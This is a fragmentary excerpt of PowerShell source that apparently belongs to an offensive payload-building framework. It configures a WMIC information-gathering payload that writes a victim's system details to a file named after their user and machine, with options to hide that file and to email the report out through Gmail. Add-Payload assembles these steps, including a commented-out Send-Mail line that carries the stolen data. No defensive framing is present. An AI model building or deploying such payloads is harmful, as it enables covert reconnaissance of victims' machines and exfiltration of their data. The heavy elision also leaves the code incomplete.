...
Function Main {
	...
	$Options = @{
		'OutputFile' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = '$PWD\WMIC_Info-$([Environment]::UserName)@$([Environment]::MachineName).html'
		}
		'Hide' = New-Object PSObject -Property @{
			'Name' = "Hide"
			'Description' = "Hide the file with the output content"
			'Required' = "False"
			'Value' = $false
		}
		'EmailReport' = New-Object PSObject -Property @{
			'Name' = "EmailReport"
			'Description' = "Send information via gmail"
			'Required' = "False"
			'Value' = $false
		}
		...
		'EmailSubject' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = 'WMIC_Info-$([Environment]::UserName)@$([Environment]::MachineName)'
		}
	}
	...
	While ($true) {
		...
		if ($Opc) {
			if ($Opc.Split(' ')[0] -eq 'Set') {
				...
				$Options.Values | Sort-Object -Property Name | Format-Table $Format -Wrap| Out-Host
...
Function Add-Payload {
	$ModuleSource = Get-Content "$PWD\data\payload_source\Information-Gathering\wmic_info.ps1" | Out-String
	
	$Command += '[IO.File]::AppendAllText("' + $Options.OutputFile.Value + '", $Info);'
	...
	if ($Options.EmailReport.Value -or $Options.EmailReport.Value -eq "true")
	{
		if ($Global:Settings.Email.User -ne "" -and $Global:Settings.Email.Password -ne "")
		{
			...
			#$Command += [String]::Format('Send-Mail -From ''{0}'' -Password ''{1}'' -Key {2} -To ''{3}'' -Subject "{4}" -Body ([IO.File]::ReadAllText("{5}")) -IsBodyHtml;', $From, $Password, $Key, $To, $Subject,$Options.OutputFile.Value)
